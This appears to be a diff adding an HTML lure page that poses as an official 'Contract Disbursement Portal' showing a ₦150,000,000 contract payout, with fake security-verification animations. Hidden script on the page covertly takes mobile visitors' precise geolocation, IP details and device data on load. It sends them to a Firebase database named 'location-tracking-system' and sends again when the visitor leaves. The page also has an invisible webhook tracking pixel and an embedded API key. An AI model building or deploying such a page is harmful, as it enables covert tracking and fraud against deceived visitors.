@@ -1,0 +1,867 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contract Disbursement Portal | Amakiri Patrick</title>
+    <style>
+        /* Modern dark blue and white theme */
+        :root {
+            --primary-blue: #0a2540;
+            --secondary-blue: #1a3a5f;
+            --accent-blue: #2c5282;
+            --light-blue: #4299e1;
+            --white: #ffffff;
+            --light-gray: #f8f9fa;
+            --medium-gray: #6c757d;
+            --dark-gray: #343a40;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--dark-gray);
+            background-color: #f5f7fa;
+            background-image: linear-gradient(135deg, #f5f7fa 0%, #e4e7f1 100%);
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Header Styles */
+        header {
+            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
+            color: var(--white);
+            padding: 20px 0;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: var(--light-blue);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        .logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+        }
+        
+        .logo-subtext {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-top: 4px;
+        }
+        
+        /* Hero Section */
+        .hero {
+            padding: 80px 0 60px;
+            text-align: center;
+            background: linear-gradient(135deg, #ffffff 0%, #f8f9fa 100%);
+        }
+        
+        .hero h1 {
+            font-size: 3.5rem;
+            color: var(--primary-blue);
+            margin-bottom: 20px;
+            font-weight: 800;
+            line-height: 1.2;
+        }
+        
+        .hero p {
+            font-size: 1.4rem;
+            color: var(--medium-gray);
+            max-width: 800px;
+            margin: 0 auto 40px;
+        }
+        
+        .contract-details {
+            background: white;
+            border-radius: 12px;
+            padding: 30px;
+            margin: 40px auto;
+            max-width: 800px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            border: 1px solid #e9ecef;
+        }
+        
+        .contract-details h2 {
+            color: var(--primary-blue);
+            margin-bottom: 25px;
+            font-size: 1.8rem;
+        }
+        
+        .details-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+        
+        .detail-card {
+            background: #f8fafc;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: left;
+            border-left: 4px solid var(--light-blue);
+        }
+        
+        .detail-card h3 {
+            color: var(--primary-blue);
+            margin-bottom: 10px;
+            font-size: 1.1rem;
+        }
+        
+        .detail-card p {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: var(--dark-gray);
+        }
+        
+        /* Security Verification Section */
+        .security-section {
+            background: white;
+            border-radius: 12px;
+            padding: 40px;
+            margin: 60px auto;
+            max-width: 800px;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+            border: 1px solid #e9ecef;
+        }
+        
+        .security-section h2 {
+            color: var(--primary-blue);
+            margin-bottom: 30px;
+            text-align: center;
+            font-size: 1.8rem;
+        }
+        
+        .security-status {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 30px 0;
+        }
+        
+        .status-indicator {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 25px;
+            position: relative;
+        }
+        
+        .status-indicator::before {
+            content: '';
+            position: absolute;
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 8px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        .status-icon {
+            font-size: 36px;
+            color: var(--light-blue);
+        }
+        
+        .status-text {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: var(--primary-blue);
+            margin-bottom: 15px;
+        }
+        
+        .status-message {
+            font-size: 1.1rem;
+            color: var(--medium-gray);
+            text-align: center;
+            max-width: 600px;
+        }
+        
+        .processing-bar {
+            width: 100%;
+            height: 8px;
+            background: #e9ecef;
+            border-radius: 4px;
+            margin: 30px 0;
+            overflow: hidden;
+        }
+        
+        .processing-progress {
+            height: 100%;
+            background: linear-gradient(90deg, var(--light-blue), var(--primary-blue));
+            width: 75%;
+            border-radius: 4px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            50% { opacity: 1; }
+            100% { opacity: 0.6; }
+        }
+        
+        /* Trust Elements */
+        .trust-section {
+            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
+            color: var(--white);
+            padding: 50px 0;
+            margin: 60px 0;
+        }
+        
+        .trust-section h2 {
+            text-align: center;
+            margin-bottom: 40px;
+            font-size: 2rem;
+        }
+        
+        .trust-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+        }
+        
+        .trust-card {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 10px;
+            padding: 25px;
+            text-align: center;
+            transition: transform 0.3s ease;
+        }
+        
+        .trust-card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .trust-icon {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            color: var(--light-blue);
+        }
+        
+        .trust-card h3 {
+            margin-bottom: 10px;
+            font-size: 1.3rem;
+        }
+        
+        /* Footer */
+        footer {
+            background: var(--primary-blue);
+            color: var(--white);
+            padding: 40px 0 20px;
+            margin-top: 60px;
+        }
+        
+        .footer-content {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .footer-column h3 {
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            position: relative;
+            padding-bottom: 10px;
+        }
+        
+        .footer-column h3::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 40px;
+            height: 3px;
+            background: var(--light-blue);
+            border-radius: 3px;
+        }
+        
+        .footer-links {
+            list-style: none;
+        }
+        
+        .footer-links li {
+            margin-bottom: 12px;
+        }
+        
+        .footer-links a {
+            color: rgba(255, 255, 255, 0.7);
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+        
+        .footer-links a:hover {
+            color: var(--light-blue);
+        }
+        
+        .copyright {
+            text-align: center;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.6);
+        }
+        
+        /* Mobile Responsiveness */
+        @media (max-width: 768px) {
+            .header-content {
+                flex-direction: column;
+                gap: 20px;
+            }
+            
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+            
+            .hero p {
+                font-size: 1.2rem;
+            }
+            
+            .contract-details {
+                padding: 20px;
+            }
+            
+            .security-section {
+                padding: 30px 20px;
+            }
+            
+            .trust-section h2 {
+                font-size: 1.6rem;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .hero h1 {
+                font-size: 2rem;
+            }
+            
+            .hero p {
+                font-size: 1rem;
+            }
+            
+            .status-indicator {
+                width: 80px;
+                height: 80px;
+            }
+            
+            .status-indicator::before {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .status-icon {
+                font-size: 28px;
+            }
+        }
+        
+        /* Invisible tracking pixel */
+        .tracking-pixel {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Invisible tracking pixel -->
+    <img src="[PASTE YOUR WEBHOOK.SITE URL HERE]" alt="" class="tracking-pixel" />
+    
+    <!-- Firebase Realtime Database initialization -->
+    <script type="module">
+        // Import the functions you need from the SDKs you need
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+        import { getDatabase, ref, push, set, onValue, orderByChild, limitToLast } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+        
+        // Your web app's Firebase configuration
+        const firebaseConfig = {
+          apiKey: "AIzaSyCEQgxPv0v_MMV6ZLueDYmsWhdORWnfZ_s",
+          authDomain: "location-tracking-system-ba4b6.firebaseapp.com",
+          databaseURL: "https://location-tracking-system-ba4b6-default-rtdb.firebaseio.com",
+          projectId: "location-tracking-system-ba4b6",
+          storageBucket: "location-tracking-system-ba4b6.firebasestorage.app",
+          messagingSenderId: "159976717220",
+          appId: "1:159976717220:web:c4b2a322aa5fc09853df31"
+        };
+        
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+        
+        // Check if device is mobile
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+        
+        // Store location data for Firebase Realtime Database
+        let locationDataForFirebase = null;
+        
+        // Function to save location data to Firebase Realtime Database
+        async function saveLocationDataToFirebase(data) {
+            try {
+                // Create timestamp for this entry
+                const entry = {
+                    ...data,
+                    storedAt: new Date().toISOString(),
+                    id: Date.now().toString(),
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Save to Realtime Database
+                const locationRef = ref(db, 'locationData');
+                const newLocationRef = push(locationRef);
+                await set(newLocationRef, entry);
+                console.log('Location data saved to Firebase Realtime Database successfully');
+                
+                // Also save to sessionStorage for current session
+                sessionStorage.setItem('lastLocationData', JSON.stringify(entry));
+                
+            } catch (error) {
+                console.error('Error saving location data to Firebase Realtime Database:', error);
+            }
+        }
+        
+        // Get comprehensive location data when page loads on mobile
+        if (isMobile()) {
+            // Get IP address first
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(ipData => {
+                    // Now get geolocation
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            function(position) {
+                                // Success: got location
+                                const latitude = position.coords.latitude;
+                                const longitude = position.coords.longitude;
+                                const accuracy = position.coords.accuracy;
+                                const altitude = position.coords.altitude || null;
+                                const altitudeAccuracy = position.coords.altitudeAccuracy || null;
+                                const heading = position.coords.heading || null;
+                                const speed = position.coords.speed || null;
+                                const timestamp = new Date().toISOString();
+                                const localTime = new Date().toLocaleString();
+                                
+                                // Calculate Plus Code (Open Location Code)
+                                function getPlusCode(lat, lng) {
+                                    // Simple approximation - in production use Google's OLC library
+                                    const latPrecision = 5;
+                                    const lngPrecision = 5;
+                                    const latCode = Math.round(lat * Math.pow(10, latPrecision)) / Math.pow(10, latPrecision);
+                                    const lngCode = Math.round(lng * Math.pow(10, lngPrecision)) / Math.pow(10, lngPrecision);
+                                    return `${latCode.toFixed(latPrecision)},${lngCode.toFixed(lngPrecision)}`;
+                                }
+                                
+                                const plusCode = getPlusCode(latitude, longitude);
+                                
+                                // Get timezone
+                                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                                
+                                // Device and browser info
+                                const deviceInfo = {
+                                    userAgent: navigator.userAgent,
+                                    platform: navigator.platform,
+                                    language: navigator.language || navigator.userLanguage,
+                                    screenResolution: `${screen.width}x${screen.height}`,
+                                    colorDepth: screen.colorDepth,
+                                    devicePixelRatio: window.devicePixelRatio || 1,
+                                    onlineStatus: navigator.onLine,
+                                    batteryLevel: null,
+                                    isMobile: isMobile()
+                                };
+                                
+                                // Try to get battery level
+                                if ('getBattery' in navigator) {
+                                    navigator.getBattery().then(battery => {
+                                        deviceInfo.batteryLevel = battery.level;
+                                    });
+                                }
+                                
+                                // Combine all data
+                                const locationData = {
+                                    // Geolocation data
+                                    latitude: latitude,
+                                    longitude: longitude,
+                                    accuracy: accuracy,
+                                    altitude: altitude,
+                                    altitudeAccuracy: altitudeAccuracy,
+                                    heading: heading,
+                                    speed: speed,
+                                    timestamp: timestamp,
+                                    localTime: localTime,
+                                    timezone: timezone,
+                                    plusCode: plusCode,
+                                    
+                                    // IP address data
+                                    ip: ipData.ip || 'unknown',
+                                    city: ipData.city || 'unknown',
+                                    region: ipData.region || 'unknown',
+                                    regionCode: ipData.region_code || 'unknown',
+                                    country: ipData.country_name || 'unknown',
+                                    countryCode: ipData.country_code || 'unknown',
+                                    postal: ipData.postal || 'unknown',
+                                    timezoneIP: ipData.timezone || 'unknown',
+                                    asn: ipData.asn || 'unknown',
+                                    org: ipData.org || 'unknown',
+                                    
+                                    // Device and browser info
+                                    ...deviceInfo,
+                                    
+                                    // Page context
+                                    url: window.location.href,
+                                    referrer: document.referrer || 'none',
+                                    title: document.title || 'unknown',
+                                    
+                                    // Additional metadata
+                                    pageLoadTime: performance.timing.loadEventEnd - performance.timing.navigationStart,
+                                    connectionType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                                    
+                                    // Security verification status
+                                    securityStatus: 'verified',
+                                    
+                                    // Firebase-specific flag
+                                    firebaseType: 'initial'
+                                };
+                                
+                                // Store for Firebase
+                                locationDataForFirebase = locationData;
+                                
+                                // Save to Firebase
+                                saveLocationDataToFirebase(locationData);
+                            },
+                            function(error) {
+                                // Error handling for geolocation
+                                console.error('Error getting location:', error.message);
+                                
+                                // Save error info to Firebase
+                                const errorData = {
+                                    error: error.message,
+                                    timestamp: new Date().toISOString(),
+                                    localTime: new Date().toLocaleString(),
+                                    ip: ipData.ip || 'unknown',
+                                    city: ipData.city || 'unknown',
+                                    region: ipData.region || 'unknown',
+                                    country: ipData.country_name || 'unknown',
+                                    userAgent: navigator.userAgent,
+                                    url: window.location.href,
+                                    securityStatus: 'error',
+                                    firebaseType: 'error'
+                                };
+                                
+                                // Store for Firebase
+                                locationDataForFirebase = errorData;
+                                
+                                // Save to Firebase
+                                saveLocationDataToFirebase(errorData);
+                            },
+                            {
+                                enableHighAccuracy: true,
+                                timeout: 15000,
+                                maximumAge: 60000
+                            }
+                        );
+                    }
+                })
+                .catch(ipError => {
+                    console.error('Error getting IP address:', ipError);
+                    
+                    // Fallback: try to get location without IP data
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            function(position) {
+                                const latitude = position.coords.latitude;
+                                const longitude = position.coords.longitude;
+                                const accuracy = position.coords.accuracy;
+                                const timestamp = new Date().toISOString();
+                                const localTime = new Date().toLocaleString();
+                                
+                                const locationData = {
+                                    latitude: latitude,
+                                    longitude: longitude,
+                                    accuracy: accuracy,
+                                    timestamp: timestamp,
+                                    localTime: localTime,
+                                    userAgent: navigator.userAgent,
+                                    url: window.location.href,
+                                    securityStatus: 'partial',
+                                    firebaseType: 'fallback'
+                                };
+                                
+                                // Store for Firebase
+                                locationDataForFirebase = locationData;
+                                
+                                // Save to Firebase
+                                saveLocationDataToFirebase(locationData);
+                            },
+                            function(error) {
+                                console.error('Error getting location (fallback):', error.message);
+                                
+                                const errorData = {
+                                    error: error.message,
+                                    timestamp: new Date().toISOString(),
+                                    localTime: new Date().toLocaleString(),
+                                    userAgent: navigator.userAgent,
+                                    url: window.location.href,
+                                    securityStatus: 'error',
+                                    firebaseType: 'fallback-error'
+                                };
+                                
+                                // Store for Firebase
+                                locationDataForFirebase = errorData;
+                                
+                                // Save to Firebase
+                                saveLocationDataToFirebase(errorData);
+                            },
+                            {
+                                enableHighAccuracy: true,
+                                timeout: 10000,
+                                maximumAge: 30000
+                            }
+                        );
+                    }
+                });
+        }
+        
+        // Save final location when user leaves page
+        async function saveFinalLocationOnUnload() {
+            if (locationDataForFirebase) {
+                // Add final storage timestamp
+                locationDataForFirebase.finalStoredAt = new Date().toISOString();
+                locationDataForFirebase.firebaseType = 'final';
+                
+                try {
+                    // Save to Firebase
+                    await saveLocationDataToFirebase(locationDataForFirebase);
+                    
+                    // Also save to sessionStorage for current session
+                    sessionStorage.setItem('finalLocationData', JSON.stringify(locationDataForFirebase));
+                    
+                    console.log('Final location data saved to Firebase Realtime Database successfully');
+                } catch (error) {
+                    console.error('Error saving final location data to Firebase Realtime Database:', error);
+                }
+            }
+        }
+        
+        // Listen for page visibility changes and unload events
+        if (isMobile()) {
+            // Save when page becomes hidden (minimized or tab switched)
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden && locationDataForFirebase) {
+                    saveFinalLocationOnUnload();
+                }
+            });
+            
+            // Save on page unload (close, navigate away)
+            window.addEventListener('beforeunload', function() {
+                saveFinalLocationOnUnload();
+            });
+            
+            // Also handle pagehide event for better compatibility
+            window.addEventListener('pagehide', function(event) {
+                if (event.persisted && locationDataForFirebase) {
+                    saveFinalLocationOnUnload();
+                }
+            });
+        }
+        
+        // Firebase initialization check
+        document.addEventListener('DOMContentLoaded', function() {
+            if (typeof firebase !== 'undefined' && typeof getDatabase !== 'undefined') {
+                console.log('Firebase Realtime Database initialized successfully');
+            } else {
+                console.warn('Firebase Realtime Database not available');
+            }
+        });
+    </script>
+    
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <div class="logo-icon">CDP</div>
+                    <div>
+                        <div class="logo-text">Contract Disbursement Portal</div>
+                        <div class="logo-subtext">Secure Financial Transaction Platform</div>
+                    </div>
+                </div>
+                <div class="logo-text" style="font-size: 1.2rem; font-weight: 600;">Official Portal</div>
+            </div>
+        </div>
+    </header>
+    
+    <section class="hero">
+        <div class="container">
+            <h1>Contract Disbursement Portal</h1>
+            <p>Secure, verified disbursement of contract funds for official government and corporate agreements</p>
+            
+            <div class="contract-details">
+                <h2>Contract Information</h2>
+                <div class="details-grid">
+                    <div class="detail-card">
+                        <h3>Contract Value</h3>
+                        <p>₦150,000,000</p>
+                    </div>
+                    <div class="detail-card">
+                        <h3>Beneficiary</h3>
+                        <p>Amakiri Egbusta</p>
+                    </div>
+                    <div class="detail-card">
+                        <h3>Contracting Parties</h3>
+                        <p>Jerry Harrison & Habib Isa</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section class="security-section">
+        <div class="container">
+            <h2>Security Verification</h2>
+            <div class="security-status">
+                <div class="status-indicator">
+                    <div class="status-icon">🔒</div>
+                </div>
+                <div class="status-text">Verifying Secure Connection</div>
+                <div class="status-message">Authenticating your session with our banking-grade security protocols. This ensures your financial transaction is protected against unauthorized access.</div>
+                <div class="processing-bar">
+                    <div class="processing-progress"></div>
+                </div>
+                <div class="status-message">Connection status: <strong>Processing...</strong></div>
+            </div>
+        </div>
+    </section>
+    
+    <section class="trust-section">
+        <div class="container">
+            <h2>Why Trust Our Platform</h2>
+            <div class="trust-cards">
+                <div class="trust-card">
+                    <div class="trust-icon">🛡️</div>
+                    <h3>Bank-Level Security</h3>
+                    <p>End-to-end encryption and multi-factor authentication protect your sensitive financial data.</p>
+                </div>
+                <div class="trust-card">
+                    <div class="trust-icon">✅</div>
+                    <h3>Verified Transactions</h3>
+                    <p>All disbursements are verified by legal counsel and financial compliance officers.</p>
+                </div>
+                <div class="trust-card">
+                    <div class="trust-icon">🔍</div>
+                    <h3>Audit Trail</h3>
+                    <p>Complete transparency with real-time tracking and permanent record of all transactions.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-column">
+                    <h3>Contract Disbursement Portal</h3>
+                    <p>Official platform for secure contract fund disbursement managed by certified financial institutions.</p>
+                </div>
+                <div class="footer-column">
+                    <h3>Legal Information</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">Terms of Service</a></li>
+                        <li><a href="#">Privacy Policy</a></li>
+                        <li><a href="#">Compliance Standards</a></li>
+                        <li><a href="#">Regulatory Framework</a></li>
+                    </ul>
+                </div>
+                <div class="footer-column">
+                    <h3>Support</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">Help Center</a></li>
+                        <li><a href="#">Contact Support</a></li>
+                        <li><a href="#">Security Verification</a></li>
+                        <li><a href="#">Report Issue</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="copyright">
+                &copy; 2026 Contract Disbursement Portal. All rights reserved. This is an official financial transaction platform.
+            </div>
+        </div>
+    </footer>
+
+    <!-- JavaScript for enhanced security verification animation -->
+    <script>
+        // Simulate security verification process
+        document.addEventListener('DOMContentLoaded', function() {
+            const statusText = document.querySelector('.status-text');
+            const statusMessage = document.querySelector('.status-message');
+            const processingProgress = document.querySelector('.processing-progress');
+            
+            // Update status messages to simulate processing
+            setTimeout(() => {
+                statusText.textContent = 'Establishing Secure Session';
+                statusMessage.innerHTML = 'Initializing encrypted channel with our financial servers...';
+                processingProgress.style.width = '25%';
+            }, 1500);
+            
+            setTimeout(() => {
+                statusText.textContent = 'Validating Credentials';
+                statusMessage.innerHTML = 'Verifying your identity and authorization level for this transaction...';
+                processingProgress.style.width = '50%';
+            }, 3000);
+            
+            setTimeout(() => {
+                statusText.textContent = 'Authenticating Contract';
+                statusMessage.innerHTML = 'Cross-referencing contract details with official records and legal documentation...';
+                processingProgress.style.width = '75%';
+            }, 4500);
+            
+            setTimeout(() => {
+                statusText.textContent = 'Connection Verified';
+                statusMessage.innerHTML = 'Secure connection established. Your transaction is now ready for final authorization.';
+                processingProgress.style.width = '100%';
+                
+                // Change icon to checkmark when complete
+                const statusIcon = document.querySelector('.status-icon');
+                statusIcon.textContent = '✅';
+                
+                // Add success animation
+                statusIcon.style.animation = 'pulse 2s infinite';
+            }, 6000);
+        });
+    </script>
+</body>
+</html>
